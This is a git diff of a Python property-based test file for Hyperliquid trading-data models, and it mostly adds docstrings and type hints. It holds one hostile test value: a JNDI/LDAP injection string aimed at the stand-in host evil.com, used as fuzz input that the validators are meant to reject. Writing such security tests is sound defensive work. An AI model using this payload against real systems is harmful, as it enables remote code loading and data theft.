@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw meta and asset context models.
 
-These tests validate critical security boundary models that process external metadata and asset context data.
-The models tested here are essential for asset configuration, leverage management, and market context.
+These tests validate critical security boundary models that process external metadata and contexts.
+The models tested here are essential for asset configuration, leverage, and market context.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious asset definition data that could manipulate trading parameters
@@ -39,13 +39,21 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_meta_and_asset_ctxs import (
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR META AND ASSET CONTEXTS MODEL TESTING
 # =============================================================================
 
 
 def asset_name_strategy() -> SearchStrategy[str]:
-    """Generate valid asset name strings."""
+    """Generate valid asset name strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common cryptocurrencies
         st.sampled_from([
@@ -110,7 +118,11 @@ def asset_name_strategy() -> SearchStrategy[str]:
 
 
 def decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for financial values."""
+    """Generate valid decimal strings for financial values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
@@ -135,7 +147,11 @@ def decimal_str_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_asset_definition_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid asset definition data."""
+    """Generate valid asset definition data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "name": draw(asset_name_strategy()),
         "szDecimals": draw(st.integers(min_value=0, max_value=18)),
@@ -146,7 +162,11 @@ def valid_asset_definition_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_asset_ctx_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid asset context data."""
+    """Generate valid asset context data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     data = {
         "name": draw(asset_name_strategy()),
         "funding": draw(decimal_str_strategy()),
@@ -165,14 +185,22 @@ def valid_asset_ctx_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_meta_response_data(draw: st.DrawFn) -> dict[str, list[dict[str, Any]]]:
-    """Generate valid meta response data."""
+    """Generate valid meta response data.
+
+    Returns:
+        dict[str, list[dict[str, Any]]]: Generated test data.
+    """
     universe = draw(st.lists(valid_asset_definition_data(), min_size=0, max_size=50))
     return {"universe": universe}
 
 
 @st.composite
 def valid_update_leverage_request_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid update leverage request data."""
+    """Generate valid update leverage request data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "asset": draw(st.integers(min_value=0, max_value=1000)),
         "isCross": draw(st.booleans()),
@@ -182,7 +210,11 @@ def valid_update_leverage_request_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_update_margin_request_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid update isolated margin request data."""
+    """Generate valid update isolated margin request data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "asset": draw(st.integers(min_value=0, max_value=1000)),
         "isBuy": draw(st.booleans()),
@@ -190,8 +222,12 @@ def valid_update_margin_request_data(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_meta_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for meta/asset security testing."""
+def malicious_meta_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for meta/asset security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Meta manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-meta}"),
@@ -247,7 +283,7 @@ class TestHyperliquidRawAssetDefinitionProperties:
     def test_asset_definition_validation_success_properties(
         self, asset_data: dict[str, Any]
     ) -> None:
-        """Property: Valid asset definition data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         name = asset_data["name"]
         assume(isinstance(name, str) and name.strip())
@@ -276,10 +312,10 @@ class TestHyperliquidRawAssetDefinitionProperties:
         malicious_value=malicious_meta_strategy(),
     )
     def test_asset_definition_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Asset definition should reject malicious inputs safely."""
-        base_data = {
+        """Property: Asset definition should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "name": "ETH",
             "szDecimals": 6,
             "maxLeverage": 50,
@@ -356,7 +392,7 @@ class TestHyperliquidRawAssetCtxProperties:
 
     @given(ctx_data=valid_asset_ctx_data())
     def test_asset_ctx_validation_success_properties(self, ctx_data: dict[str, Any]) -> None:
-        """Property: Valid asset context data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         name = ctx_data["name"]
         assume(isinstance(name, str) and name.strip())
@@ -427,10 +463,10 @@ class TestHyperliquidRawAssetCtxProperties:
         malicious_value=malicious_meta_strategy(),
     )
     def test_asset_ctx_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Asset context should reject malicious inputs safely."""
-        base_data = {
+        """Property: Asset context should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "name": "BTC",
             "funding": "0.0001",
             "markPx": "30000.0",
@@ -506,7 +542,7 @@ class TestHyperliquidRawMetaResponseProperties:
     def test_meta_response_validation_success_properties(
         self, meta_data: dict[str, list[dict[str, Any]]]
     ) -> None:
-        """Property: Valid meta response data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Validate universe items
         valid_universe = []
         for asset_def in meta_data["universe"]:
@@ -553,7 +589,9 @@ class TestHyperliquidRawMetaResponseProperties:
             st.dictionaries(st.text(), st.text()),
         ])
     )
-    def test_meta_response_invalid_universe_properties(self, invalid_universe: Any) -> None:
+    def test_meta_response_invalid_universe_properties(
+        self, invalid_universe: MaliciousInput
+    ) -> None:
         """Property: Meta response should reject non-list universe."""
         meta_data = {"universe": invalid_universe}
 
@@ -630,7 +668,7 @@ class TestHyperliquidRawUpdateRequestProperties:
     def test_update_leverage_request_validation_success_properties(
         self, leverage_data: dict[str, Any]
     ) -> None:
-        """Property: Valid leverage request data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         assume(isinstance(leverage_data["asset"], int) and leverage_data["asset"] >= 0)
         assume(isinstance(leverage_data["isCross"], bool))
@@ -654,7 +692,7 @@ class TestHyperliquidRawUpdateRequestProperties:
     def test_update_margin_request_validation_success_properties(
         self, margin_data: dict[str, Any]
     ) -> None:
-        """Property: Valid margin request data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         assume(isinstance(margin_data["asset"], int) and margin_data["asset"] >= 0)
         assume(isinstance(margin_data["isBuy"], bool))
@@ -677,10 +715,10 @@ class TestHyperliquidRawUpdateRequestProperties:
         malicious_value=malicious_meta_strategy(),
     )
     def test_update_leverage_request_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Update leverage request should reject malicious inputs safely."""
-        base_data = {"asset": 1, "isCross": True, "leverage": 10}
+        """Property: Update leverage request should reject malicious inputs."""
+        base_data: dict[str, object] = {"asset": 1, "isCross": True, "leverage": 10}
         base_data[field_name] = malicious_value
 
         # Property: Malicious input should be rejected
@@ -692,10 +730,10 @@ class TestHyperliquidRawUpdateRequestProperties:
         malicious_value=malicious_meta_strategy(),
     )
     def test_update_margin_request_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Update margin request should reject malicious inputs safely."""
-        base_data = {"asset": 1, "isBuy": False, "ntli": 100}
+        """Property: Update margin request should reject malicious inputs."""
+        base_data: dict[str, object] = {"asset": 1, "isBuy": False, "ntli": 100}
         base_data[field_name] = malicious_value
 
         # Property: Malicious input should be rejected
